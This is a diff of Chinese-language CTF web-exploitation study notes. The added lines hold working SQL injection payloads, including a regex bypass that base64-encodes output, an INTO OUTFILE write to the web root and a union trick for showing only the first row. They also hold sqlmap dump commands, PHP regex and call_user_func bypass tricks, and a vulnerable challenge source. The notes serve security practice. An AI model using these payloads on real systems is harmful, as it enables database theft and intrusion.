@@ -353,13 +353,13 @@ if __name__ == '__main__':
 ```bash
 # 找到注入点，如 /?id=1
 # 查数据库
-python sqlmap.py -u http://x.com/?id=1 --dbs
+python sqlmap.py --batch -u http://x.com/?id=1 --dbs
 # 查 N 数据库的表名
-python sqlmap.py -u http://x.com/?id=1 -D N --tables
+python sqlmap.py --batch -u http://x.com/?id=1 -D N --tables
 # 查 N 数据库的A 表的列名
-python sqlmap.py -u http://x.com/?id=1 -D N -T A --columns
+python sqlmap.py --batch -u http://x.com/?id=1 -D N -T A --columns
 # 查 N 数据库的 A 表的 B 列数据
-python sqlmap.py -u http://x.com/?id=1  -D N -T A -C B --dump
+python sqlmap.py --batch -u http://x.com/?id=1  -D N -T A -C B --dump
 
 
 # 高级注入（只举例第一步，同样适用于 POST 请求）
@@ -435,6 +435,45 @@ select * from 'admin' where password=md5($pass,true)
 
   这些特征都是sqlmap默认情况下会查找的。然而，不同的应用可能会返回不同的错误消息或者其他的特征，因此可能需要根据应用的具体行为来配置sqlmap，让它能够正确地判断注入是否成功。
 
+##### 绕过正则表达式
+
+- --+ 和 -- - 都是注释符，相同的效果
+- 以下只是示例，具体题目请更改表名和属性名
+
+###### if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
+
+需要绕过 flag 和 0-9 数字
+
+首先在 SQL 查询时替换数字，并将关键部分进行 base64 加密
+
+```sql
+-1' union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ') from ctfshow_user4 where username='flag' --+
+```
+
+查询到结果后，进行解密
+
+```python
+import base64
+
+# 替换这个字符串即可
+flagstr = "YnumCRmcnumBhvdnumCtlMDhhMDBiNynumAhZmUwLTQxYTItOTAnumENCnumJnumAMnumBMyZGMnumEYWEzOWJnumI"
+flag = flagstr.replace('numA', '1').replace('numB', '2').replace('numC', '3').replace('numD', '4').replace(
+    'numE', '5').replace('numF', '6').replace('numG', '7').replace('numH', '8').replace('numI', '9').replace('numJ', '0')
+print(base64.b64decode(flag))
+```
+
+###### 更复杂的正则如 if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
+
+题目过滤了所有 ascii 码表的 0-127 所代表的字符。(这个范围包括了所有的控制字符，标准的英文字母，数字和标点符号。)
+
+这里的思路是不把flag直接输出的网页，而是保存在服务器的一个目录下面。
+
+```sql
+' union select 1,group_concat(password) from ctfshow_user5 into outfile '/var/www/html/1.txt'-- -
+```
+
+这段语句执行成功后可能没有任何提示（甚至提醒报错），自行访问 `/1.txt` 即可
+
 ##### 联合查询 (union)
 
 例子：
@@ -460,6 +499,14 @@ $sql = "select username,password from user where username !='flag' and id = '".$
 ```sql
 1' union select 1,2,3%23
 ```
+
+如果网站只显示返回数据的第一行内容，可以尝试
+
+```sql
+' union select 1,2,3%23
+```
+
+这样 union 后查询到的内容就变成了第一行
 
 ###### 测试第三列能否显示 database()
 
@@ -594,7 +641,10 @@ chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。�
 
 ###### 猜 flag
 
-该方案用于已数据库的两个返回内容，如知道 id=1 和 id=2 的返回内容，通过 id 的填充值来注入。例题：https://www.ctfer.vip/problem/1
+- 该方案用于已数据库的两个返回内容，如知道 id=1 和 id=2 的返回内容，通过 id 的填充值来注入。
+- 条件：需要查询的值就在这张表中的一个属性里
+
+例题：https://www.ctfer.vip/problem/1
 
 ```python
 #buuctf web Hack World
@@ -679,7 +729,6 @@ SELECT * FROM users WHERE username='vampire     ';
 - 看到类似 ?id=1 的 url，无论是不是一个正常页面，可以联想到注入（尤其可以联想到伪协议）
 - 网页上显示的未必是真实源码，如果题目过滤了网页中代码没显示的字符，应该联想到网页中代码不真实。寻找真实源码或其他突破口
 - 即便是代码审计的题，也要有看源码和 HTTP headers 的习惯
-- php 正则表达式后加一个 /i 表示大小写不敏感匹配
 - include('index.php') 后的文件未必会显示在前端，只有 echo 后才会显示到前端
 - 使用 include 包含文件时，如果不显示文件内容，记得使用伪协议。伪协议往往是 `php://` 开头，如果正则表达式只允许 `php` 开头，首先想到伪协议 
 - 看到 PHP 返回内容是 HTTP Headers，可以联想到 %00截断
@@ -697,7 +746,9 @@ SELECT * FROM users WHERE username='vampire     ';
 
 - $@ 和 %27%27 替代空字符串
 
-- 正则多行绕过，使用 `%0Aflag` (`%0A` 是换行符) 绕过 `preg('/^(.*)flag(.*)$/'', $_GET['aaa'])` (因为该正则表达式不会匹配换行符，若要匹配换行符，应改为 `preg_replace('/^(.*)level(.*)$/s', $_GET['aaa'])`)  。注意，在文本编辑器中对 `\n` 进行 URL 编码会得到错误答案 `%5Cn` (只是将 \ 和 n 两个字符编码的结果)，文本编辑器中应该将回车符 (按 Enter) 编码。
+- 善于使用正则表达式没有同时匹配大小写，但 PHP 对大小写字母不敏感的特性绕过
+
+- 正则多行绕过，使用 `%0Aflag` (`%0A` 是换行符) 绕过 `preg('/^(.*)flag(.*)$/'', $_GET['aaa'])` (因为该正则表达式不会匹配换行符，若要匹配换行符，应改为 `preg_replace('/^(.*)level(.*)$/s', $_GET['aaa'])`)  [`s` 是匹配多行]。注意，在文本编辑器中对 `\n` 进行 URL 编码会得到错误答案 `%5Cn` (只是将 \ 和 n 两个字符编码的结果)，文本编辑器中应该将回车符 (按 Enter) 编码。
   - HTTP GET 方法的 `#` 必须被编码为 %23 再发送，因为 `#` 这部分通常由浏览器处理，不会发送到服务器
 
 - 如果 ; 被过滤，可以用 ?> 代替
@@ -1940,6 +1991,61 @@ echo mt_rand();
 
 mt_srand(372619038) 设置了 mt_rand() 的种子为 372619038，这意味着接下来的 mt_rand() 函数将会返回一个固定的值
 
+##### call_user_func
+
+`call_user_func` 是 PHP 中的一个函数，用于调用一个用户自定义的函数或方法。
+
+它的基本语法如下：
+
+```php
+call_user_func(callable $callback, mixed ...$parameters): mixed
+```
+
+`$callback` 参数指定要调用的函数或方法。它可以是一个字符串，表示函数名或类方法名，也可以是一个数组，表示类名和方法名的组合，或者是一个可调用对象。
+
+`$parameters` 参数是可选的，用于传递给被调用函数或方法的参数。你可以传递任意数量的参数，按照它们在函数或方法签名中的顺序进行传递。
+
+`call_user_func` 函数会执行指定的函数或方法，并返回其返回值。如果调用失败，它会返回 `false`。
+
+下面是一些使用 `call_user_func` 的示例：
+
+```php
+function greet($name) {
+    echo "Hello, $name!";
+}
+
+call_user_func('greet', 'John'); // 输出：Hello, John!
+
+class MyClass {
+    public static function sayHello($name) {
+        echo "Hello, $name!";
+    }
+}
+
+call_user_func(['MyClass', 'sayHello'], 'Jane'); // 输出：Hello, Jane!
+
+$obj = new MyClass();
+call_user_func([$obj, 'sayHello'], 'Alice'); // 输出：Hello, Alice!
+```
+
+除了 `call_user_func`，PHP 还提供了一些类似的函数，如 `call_user_func_array` 和 `call_user_method`（在 PHP 7 中已被废弃）。这些函数在不同的使用场景下提供了更多的灵活性。
+
+###### GET 传参
+
+例如，我们想执行下面代码 `MyClass` 类的 `sayHello` 方法
+
+```php
+class MyClass {
+    public static function sayHello() {
+        echo "Hello!";
+    }
+}
+
+call_user_func($_GET['p']);
+```
+
+传参时让 `p` 为数组就行了，例如 `?p[0]=MyClass&p[1]=sayHello` 或者 `?p=MyClass::sayHello` (`?p=MyClass::sayHello` 使用了静态方法调用的方式。在这种情况下，参数 `p` 直接指定了要调用的类和方法，中间使用双冒号 `::` 分隔。这种方式适用于调用静态方法或者不需要传递额外参数的情况。)
+
 ##### phpinfo
 
 在 `User/Group` 栏可以看到当前用户名（当前用户名即权限，如 `root` 或其他任何用户名）
@@ -2578,5 +2684,28 @@ if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){
 }
 
 ?>
+```
+
+### NSS [SWPUCTF 2022 新生赛]numgame
+
+https://www.ctfer.vip/problem/2666
+
+```php
+<?php
+error_reporting(0);
+//hint: 与get相似的另一种请求协议是什么呢
+include("flag.php");
+class nss{
+    static function ctf(){
+        include("./hint2.php");
+    }
+}
+if(isset($_GET['p'])){
+    if (preg_match("/n|c/m",$_GET['p'], $matches))
+        die("no");
+    call_user_func($_GET['p']);
+}else{
+    highlight_file(__FILE__);
+}
 ```
 
